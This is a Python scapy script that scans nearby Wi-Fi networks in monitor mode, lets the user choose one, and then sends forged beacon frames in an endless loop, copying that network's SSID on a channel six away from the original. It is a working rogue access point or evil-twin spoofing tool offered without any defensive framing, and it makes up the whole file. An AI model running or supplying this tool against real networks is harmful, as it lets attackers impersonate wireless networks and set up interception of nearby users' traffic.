import os
import threading
import time
import fcntl

from scapy.all import *
from tabulate import tabulate


interface = "wlan0mon"
unique_networks = {}

def get_mac_address(ifname):
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    info = fcntl.ioctl(s.fileno(), 0x8927, struct.pack('256s', ifname[:15].encode('utf-8')))
    return ':'.join('%02x' % b for b in info[18:24])

def channel_hopper():
    while True:
        for channel in range(1, 14):  # 2.4 GHz channels (1-13)
            os.system(f"iw dev {interface} set channel {channel}")
            time.sleep(1)


def callback(packet):
    if packet.haslayer(Dot11Beacon):
        ssid = packet[Dot11Elt].info.decode()
        bssid = packet[Dot11].addr3
        src = packet[Dot11].addr2
        rssi = packet.dBm_AntSignal
        channel = int(ord(packet[Dot11Elt:3].info))

        if ssid not in unique_networks:
            unique_networks[ssid] = {bssid: {"channels": [channel], "rssi": rssi}}
        else:
            if bssid not in unique_networks[ssid]:
                unique_networks[ssid][bssid] = {"channels": [channel], "rssi": rssi}
            else:
                if channel not in unique_networks[ssid][bssid]["channels"]:
                    unique_networks[ssid][bssid]["channels"].append(channel)


def forge_and_send_packet(ssid, bssid):
    """
    Forge a Beacon frame based on the user-selected BSSID and send it on a different channel
    6 channels away from the original network.
    :param ssid: the SSID of the packet to forge
    :param bssid: the BSSID of the packet to forge
    """
    original_channel = unique_networks[ssid][bssid]["channels"][0]
    new_channel = original_channel + 6 if original_channel <= 7 else original_channel - 6
    new_channel = max(1, min(new_channel, 13))
    
    my_mac = get_mac_address(interface)

    # Forge the Beacon packet
    pkt = RadioTap() / Dot11(type=0, subtype=8, addr1="ff:ff:ff:ff:ff:ff", addr2=my_mac, addr3=my_mac) / Dot11Beacon(cap="ESS+privacy") / Dot11Elt(ID="SSID", info=ssid, len=len(ssid)) / Dot11Elt(ID="DSset", info=chr(new_channel))

    # Send the forged packet on the new channel
    sendp(pkt, iface=interface, inter=0.1, loop=1, verbose=1)



def main():
    headers = ["Index", "SSID", "BSSID", "Channels", "Signal Strength (dBm)"]

    print("Scanning for nearby SSIDs, BSSIDs, channels, and signal strengths...")

    # Start the channel hopper thread
    hopper_thread = threading.Thread(target=channel_hopper)
    hopper_thread.daemon = True
    hopper_thread.start()

    try:
        # Use scapy to sniff packets
        sniff(iface=interface, prn=callback, timeout=30, store=False)  # Increase timeout to 60 seconds
    except KeyboardInterrupt:
        pass

    print("\nScan completed")

    networks = []
    index = 0
    for ssid, bssid_data in unique_networks.items():
        for bssid, data in bssid_data.items():
            channels = data["channels"]
            rssi = data["rssi"]
            index += 1
            networks.append([index, ssid, bssid, ",".join(str(c) for c in channels), rssi])

    print(tabulate(networks, headers=headers))

    if networks:
        while True:
            selection = input("Enter the index of the network you want to select (q to quit): ")
            if selection.lower() == "q":
                break
            try:
                index = int(selection)
                if index < 1 or index > len(networks):
                    print("Invalid selection")
                else:
                    selected_network = networks[index-1]
                    ssid = selected_network[1]
                    bssid = selected_network[2]
                    channels = selected_network[3].split(",")
                    rssi = selected_network[4]
                    print(f"Selected network: {ssid} ({bssid})")
                    print(f"Channels: {', '.join(channels)}")
                    print(f"Signal Strength: {rssi} dBm")
                    forge_and_send_packet(ssid, bssid)
                    break
            except ValueError:
                print("Invalid selection")
                continue

if __name__ == "__main__":
    main()